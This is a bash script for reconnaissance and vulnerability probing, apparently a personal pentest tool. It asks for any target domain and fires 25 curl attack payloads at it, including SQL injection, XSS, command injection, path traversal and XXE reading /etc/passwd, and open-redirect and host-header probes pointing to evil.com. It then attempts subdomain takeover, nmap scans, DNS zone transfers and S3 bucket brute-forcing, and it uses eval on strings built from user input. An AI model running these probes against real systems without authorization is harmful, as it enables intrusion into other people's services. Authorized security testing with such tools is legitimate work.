#!/bin/bash
set -u  # Avoid silent failures, but allow probe errors to continue

# === Config ===
read -p "Username?: " USER
FINGERPRINTS="/home/$USER/Recon_NG/DVIR/tools/subjack/fingerprints.json"
LOG_CURL="recon_ng_curl.log"
LOG_TAKEOVER="recon_ng_takeover.log"
LOG_NMAP="recon_ng_nmap.log"
LOG_EXTENDED="recon_ng_extended.log"
LOG_DNS="recon_ng_dns.log"

# === Input ===
read -p "Set Custom Headers? (e.g. X-Test: foo): " HEADER
TARGET=""
while [[ -z "$TARGET" ]]; do
  read -p "Target domain or IP (e.g. razer.com): " TARGET
  [[ -z "$TARGET" ]] && echo "[!] Target cannot be empty. Try again."
done

echo "[*] $(date '+%F %T') — Starting recon on $TARGET with header [$HEADER]" | tee -a "$LOG_CURL"

# === Probes ===
declare -A PROBES=(
  [1]='Header Injection|curl -s -H "'"$HEADER"'" https://'"$TARGET"
  [2]='Open Redirect|curl -s -H "'"$HEADER"'" -L https://'"$TARGET"'/redirect?url=https://evil.com'
  [3]='SSRF via GET|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/fetch?url=http://127.0.0.1'
  [4]='Method Tampering|curl -s -H "'"$HEADER"'" -X PUT https://'"$TARGET"'/resource'
  [5]='CORS Misconfig|curl -s -H "'"$HEADER"'" -H "Origin: https://evil.com" -I https://'"$TARGET"
  [6]='Host Header Injection|curl -s -H "'"$HEADER"'" -H "Host: evil.com" https://'"$TARGET"
  [7]='User-Agent Spoofing|curl -s -H "'"$HEADER"'" -H "User-Agent: sqlmap" https://'"$TARGET"
  [8]='XSS via Query|curl -s -H "'"$HEADER"'" "https://'"$TARGET"'/search?q=%3Cscript%3Ealert(1)%3C/script%3E"'
  [9]='XSS via Header|curl -s -H "'"$HEADER"'" -H "Referer: <script>alert(1)</script>" https://'"$TARGET"
  [10]='SQLi via Param|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/item?id=1%27%20OR%20%271%27=%271'
  [11]='SQLi via Header|curl -s -H "'"$HEADER"'" -H "X-User: 1 OR 1=1" https://'"$TARGET"
  [12]='Command Injection|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/run?cmd=ls;whoami'
  [13]='Path Traversal|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/download?file=../../etc/passwd'
  [14]='File Inclusion|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/include?file=../../etc/passwd'
  [15]='Prototype Pollution|curl -s -H "'"$HEADER"'" -X POST -d "{\"__proto__\": {\"polluted\": true}}" https://'"$TARGET"'/api'
  [16]='JSON Injection|curl -s -H "'"$HEADER"'" -X POST -H "Content-Type: application/json" -d "{\"user\":\"admin\"}" https://'"$TARGET"'/api/login'
  [17]='XXE|curl -s -H "'"$HEADER"'" -X POST -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>" https://'"$TARGET"'/xml'
  [18]='Redirect Chain|curl -s -H "'"$HEADER"'" -L https://'"$TARGET"'/chain?url=https://evil.com'
  [19]='Cache Poisoning|curl -s -H "'"$HEADER"'" -H "X-Forwarded-Host: evil.com" https://'"$TARGET"
  [20]='Cookie Manipulation|curl -s -H "'"$HEADER"'" -H "Cookie: session=evil" https://'"$TARGET"
  [21]='Rate Limit Abuse|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/api/ping'
  [22]='Verbose Error Disclosure|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/error?trigger=true'
  [23]='Debug Endpoint|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/debug'
  [24]='Unvalidated Redirect|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/forward?next=https://evil.com'
  [25]='JWT Tampering|curl -s -H "'"$HEADER"'" -H "Authorization: Bearer fake.jwt.token" https://'"$TARGET"'/api'
)

# === Execute Probes ===
for i in "${!PROBES[@]}"; do
  LABEL="${PROBES[$i]%%|*}"
  CMD="${PROBES[$i]#*|}"
  echo "[*] $(date '+%F %T') — Test $i: $LABEL" | tee -a "$LOG_CURL"
  echo "[*] Command: $CMD" | tee -a "$LOG_CURL"
  {
    eval "$CMD"
  } >> "$LOG_CURL" 2>&1 || echo "[!] Probe $i failed — continuing..." | tee -a "$LOG_CURL"
done

# === Subdomain Takeover ===
function scan_takeovers {
  echo "[*] $(date '+%F %T') — Starting Subdomain Takeover Scan" | tee -a "$LOG_TAKEOVER"
  if command -v subfinder &>/dev/null; then
    subfinder -d "$TARGET" -o sub.txt
  else
    echo "[!] subfinder not found — skipping" | tee -a "$LOG_TAKEOVER"
    return
  fi

  if [[ ! -s sub.txt ]]; then
    echo "[!] No subdomains found. Skipping Subjack." | tee -a "$LOG_TAKEOVER"
    return
  fi

  if [[ -f "$FINGERPRINTS" ]]; then
    subjack -w sub.txt -t 50 -timeout 30 -ssl -v -o takeovers.txt -c "$FINGERPRINTS"
    [[ -s takeovers.txt ]] && echo "[*] Takeover candidates written to takeovers.txt" | tee -a "$LOG_TAKEOVER" || echo "[!] No takeovers found." | tee -a "$LOG_TAKEOVER"
  else
    echo "[!] Fingerprints file missing — skipping Subjack" | tee -a "$LOG_TAKEOVER"
  fi
}

scan_takeovers

# === Nmap Scan ===
echo "[*] $(date '+%F %T') — Starting Nmap scan on $TARGET" | tee -a "$LOG_NMAP"
if command -v nmap &>/dev/null; then
  nmap -Pn -sV -T4 "$TARGET" >> "$LOG_NMAP" 2>&1
  echo "[*] $(date '+%F %T') — Nmap scan complete" | tee -a "$LOG_NMAP"
else
  echo "[!] Nmap not found — skipping scan" | tee -a "$LOG_NMAP"
fi

# === Extended Enumeration ===
read -p "Start extended enumeration on $TARGET? (y/n): " EXT_ENUM
if [[ "$EXT_ENUM" =~ ^[Yy]$ ]]; then
  NSPACE="extended_enum_$(date +%Y%m%d_%H%M%S)"
  mkdir -p "$NSPACE"

  echo "[*] $(date '+%F %T') — Starting extended enumeration" | tee -a "$LOG_EXTENDED"

  # IPv6 Scan
  if dig AAAA "$TARGET" +short | grep -q .; then
    echo "[*] IPv6 detected — running scan" | tee -a "$LOG_EXTENDED"
    nmap -sT -6 -Pn --top-ports 1000 --open "$TARGET" -oA "$NSPACE/nmap_ipv6"
  else
    echo "[!] No IPv6 record found — skipping" | tee -a "$LOG_EXTENDED"
  fi

  # DNS & Domain
  NS=$(dig +short NS "$TARGET" | head -n1)
  if [[ -n "$NS" ]]; then
    echo "[*] Attempting AXFR on $TARGET via $NS" | tee -a "$LOG_EXTENDED"
    dig AXFR "$TARGET" @"$NS" > "$NSPACE/zone_transfer.txt"
    dig +dnssec "$TARGET"
  dig +dnssec "$TARGET" > "$NSPACE/dnssec.txt"
  echo "[*] DNSSEC info written to $NSPACE/dnssec.txt" | tee -a "$LOG_EXTENDED"
  fi
  # DNSX Subdomain Enumeration
  if command -v dnsx &>/dev/null; then
    if [[ -s /usr/share/wordlists/subdomains.txt ]]; then
      echo "[*] Running dnsx on $TARGET" | tee -a "$LOG_EXTENDED"
      dnsx -d "$TARGET" -w /usr/share/wordlists/subdomains.txt -o "$NSPACE/dnsx_subs.txt"
      echo "[*] dnsx output saved to $NSPACE/dnsx_subs.txt" | tee -a "$LOG_EXTENDED"
    else
      echo "[!] Wordlist missing or empty — skipping dnsx" | tee -a "$LOG_EXTENDED"
    fi
  else
    echo "[!] dnsx not found — skipping subdomain enumeration" | tee -a "$LOG_EXTENDED"
  fi

  # AWS Bucket Enumeration
  if [[ -s /usr/share/wordlists/s3_buckets.txt ]]; then
    echo "[*] Starting S3 bucket brute-force for $TARGET" | tee -a "$LOG_EXTENDED"
    while read -r bucket; do
      [[ -z "$bucket" ]] && continue
      URL="http://$bucket.$TARGET.s3.amazonaws.com"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
      echo "[$STATUS] $URL" | tee -a "$NSPACE/s3_enum.txt"
    done < /usr/share/wordlists/s3_buckets.txt
    echo "[*] S3 bucket scan complete — results in $NSPACE/s3_enum.txt" | tee -a "$LOG_EXTENDED"
  else
    echo "[!] S3 bucket wordlist missing — skipping" | tee -a "$LOG_EXTENDED"
  fi

  # IAM Role Enumeration (if AWS domain detected)
  if [[ "$TARGET" == *.amazonaws.com ]]; then
    echo "[*] Enumerating IAM roles on $TARGET" | tee -a "$LOG_EXTENDED"
    aws iam list-roles > "$NSPACE/iam_roles.json" 2>/dev/null
    echo "[*] IAM roles written to $NSPACE/iam_roles.json" | tee -a "$LOG_EXTENDED"
  fi

  echo "[*] Extended enumeration complete for $TARGET" | tee -a "$LOG_EXTENDED"
fi

echo "[*] Recon complete for $TARGET — logs saved to recon_ng_*.log and $NSPACE/" | tee -a "$LOG_CURL"

